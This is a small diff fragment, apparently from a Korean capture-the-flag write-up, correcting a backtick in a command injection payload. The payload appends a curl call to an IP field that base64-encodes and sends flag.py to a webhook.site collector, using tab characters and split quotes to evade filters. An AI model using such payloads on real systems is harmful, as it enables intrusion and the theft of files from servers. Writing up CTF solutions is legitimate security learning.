@@ -18,7 +18,7 @@ URL Encode:
 8.8.8.8`curl%09https://webhook.site/webhook-id%09-d%09\`c'a't%09fl'a'g.py|base64\``
 
 URL Decode:
-8.8.8.8`curl	https://webhook.site/webhook-id	-d	\`c'a't	fl'a'g.py|base64\`
+8.8.8.8`curl	https://webhook.site/webhook-id	-d	\`c'a't	fl'a'g.py|base64\``
 ```
 
 위와 같이 코드를 작성하였다.
